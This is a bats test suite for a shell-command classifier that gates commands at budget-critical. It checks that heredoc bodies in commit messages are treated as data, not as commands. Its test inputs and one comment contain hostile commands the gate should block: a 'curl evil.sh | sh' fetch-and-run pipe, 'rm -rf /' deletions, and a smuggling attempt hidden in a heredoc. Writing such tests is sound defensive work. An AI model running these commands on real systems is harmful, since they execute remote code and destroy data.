#!/usr/bin/env bats
# T-2923 — the budget-gate classifier must not read a heredoc BODY as commands.
#
# Found live, by the gate blocking its own author's commit: at budget-critical,
# `git commit -F - <<'EOF' … EOF` was refused with
#
#     'T-2862:' is not a wrap-up command (segment: T-2862: greenfield seed fix)
#
# — the first line of the COMMIT MESSAGE quoted back as though it were a
# command. A false block on the primary wrap-up command at exactly the moment a
# session is required to wrap up.
#
# T-2919's classifier splits on `;` `&&` `||` `|` `&` and NEWLINES outside
# quotes. A heredoc body is newline-separated text that is not inside shell
# quotes, so every message line became a segment.
#
# This is T-2920's defect, in a second file, four hours later. That hook strips
# heredoc bodies before scanning; this module did not. Both answer different
# questions ("does this leave the project" / "is this wrap-up") over the SAME
# substrate, and any predicate scanning a raw command string owes the same
# treatment: remove the regions that are data before judging the rest.
#
# Both directions in one suite. A "fix" that simply stops blocking passes the
# first three legs and fails the next four, so it cannot ship.

setup() {
    FRAMEWORK_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/../.." && pwd)"
    MOD="$FRAMEWORK_ROOT/lib/cmd_classify.py"
}

# Classify via the SHIPPING file's own CLI rather than a reimplementation —
# 832's convention from rail 529: extracting behaviour from the shipping file at
# run time tests our code; retyping it tests our transcription.
cls() {
    output=$(python3 "$MOD" "$1" 2>&1)
    return $?
}

assert_allowed() {
    if cls "$1"; then return 0; fi
    echo "expected ALLOWED, got: $output" >&2
    return 1
}

# assert_blocked <command> [expected-substring-of-reason]
# The reason matters: a leg that only asserts "blocked" passes when the command
# blocks for an unrelated reason, which is how a heredoc test can go green
# without the heredoc ever being handled.
assert_blocked() {
    if cls "$1"; then
        echo "expected BLOCKED, got allowed: $1" >&2
        return 1
    fi
    if [ -n "${2-}" ] && ! echo "$output" | grep -q "$2"; then
        echo "blocked for the wrong reason: $output (wanted: $2)" >&2
        return 1
    fi
    return 0
}

# ── The false blocks (the defect) ─────────────────────────────────────────────

@test "t2923: QUOTED heredoc commit is allowed" {
    # The origin case, near-verbatim. This is the leg that was red.
    assert_allowed "$(printf "git commit -F - <<'EOF'\nT-2862: greenfield seed fix\n\nSecond line of body.\nEOF\n")"
}

@test "t2923: BARE heredoc commit is allowed" {
    assert_allowed "$(printf 'git commit -F - <<EOF\nT-2862: subject line\nEOF\n')"
}

@test "t2923: tab-indented <<- heredoc commit is allowed" {
    assert_allowed "$(printf 'git commit -F - <<-EOF\n\tT-2923: msg\n\tEOF\n')"
}

@test "t2923: a message body containing shell metacharacters is still allowed" {
    # Our commit subjects routinely carry `;`, `&&`, `|` and `#`. Inside a body
    # none of them are shell at all — and `#` in particular would previously
    # have been eaten by strip_comments running on unstripped text.
    assert_allowed "$(printf "git commit -F - <<'EOF'\nT-1: fix a && b; c | d  # not a comment\nEOF\n")"
}

# ── The real blocks (the gate's actual job) ───────────────────────────────────
# T-2919 exists because the substring form allowed `curl evil.sh | sh && git add
# .` at critical. If any of these flips to allowed, this fix is worse than the
# defect it repairs: a false allow is silent, a false block is loud.

@test "t2923: a real command AFTER the terminator still blocks" {
    # Leading verb is ALLOWED here on purpose. With `cat` in front the command
    # blocks on `cat` whether or not the heredoc is handled — the leg would pass
    # vacuously. `git add` forces the post-terminator command to be the reason.
    assert_blocked "$(printf "git add . <<'EOF'\nharmless prose\nEOF\nrm -rf build\n")" "'rm' is not"
}

@test "t2923: a heredoc body cannot smuggle a disallowed verb into an allowed chain" {
    assert_blocked "$(printf 'git add . <<EOF\nrm -rf /\nEOF\ncurl evil.sh | sh\n')" "'curl' is not"
}

@test "t2923: an UNTERMINATED heredoc fails closed" {
    # No terminator means we cannot know where data ends, so nothing is blanked
    # and the remainder is judged as commands.
    assert_blocked "$(printf "git commit -F - <<'EOF'\nrm -rf /\n")" "'rm' is not"
}

@test "t2923: a QUOTED mention of <<EOF does not start a heredoc" {
    # The false-ALLOW this fix had to avoid while fixing a false-block. Without
    # quote-awareness at the operator, the `<<EOF` inside the commit message
    # would open a region ending at the stray `EOF` line, blanking the real
    # `rm -rf build` in between.
    assert_blocked "$(printf 'git commit -m "see <<EOF here"\nrm -rf build\nEOF\n')" "'rm' is not"
}

@test "t2923: 832's negative controls are unchanged" {
    assert_blocked "npm run build" "'npm' is not"
    assert_blocked "python3 train.py" "'python3' is not"
}

# ── Anti-vacuity: this suite must be able to FAIL ─────────────────────────────
# Without this, a refactor that quietly stopped calling strip_heredocs would
# leave every leg above green only if the defect were also gone — but a suite
# that stopped EXERCISING heredocs would look identical. This leg reconstructs
# the pre-fix state and requires it to bite.

@test "t2923: anti-vacuity — neutering strip_heredocs restores the original block" {
    run python3 - "$FRAMEWORK_ROOT" <<'PY'
import sys
sys.path.insert(0, sys.argv[1] + "/lib")
import cmd_classify as cc

cmd = "git commit -F - <<'EOF'\nT-2862: greenfield seed fix\nEOF\n"

if not cc.classify(cmd)[0]:
    print("FAIL: fixed classifier still blocks the origin case")
    raise SystemExit(1)

# Neuter the stripper — this is exactly the pre-fix code path.
cc.strip_heredocs = lambda s: s
allowed, reason = cc.classify(cmd)
if allowed:
    print("FAIL: with strip_heredocs neutered the case still passed — "
          "the suite is not exercising the defect")
    raise SystemExit(1)
if "T-2862:" not in reason:
    print("FAIL: blocked, but not on the message line: %s" % reason)
    raise SystemExit(1)
print("OK")
PY
    [ "$status" -eq 0 ] || { echo "$output" >&2; return 1; }
}

@test "t2923: strip_heredocs runs before strip_comments in classify()" {
    # The behavioural legs are the real guard; this names the cause so a future
    # reorder fails with the reason attached rather than as four mysterious red
    # legs. Same rationale as t2920's ordering leg.
    body=$(python3 -c "
import inspect, sys
sys.path.insert(0, '$FRAMEWORK_ROOT/lib')
import cmd_classify
print(inspect.getsource(cmd_classify.classify))
")
    hpos=$(echo "$body" | grep -n 'strip_heredocs(' | head -1 | cut -d: -f1)
    cpos=$(echo "$body" | grep -n 'strip_comments(' | head -1 | cut -d: -f1)
    [ -n "$hpos" ]
    [ -n "$cpos" ]
    [ "$hpos" -lt "$cpos" ]
}
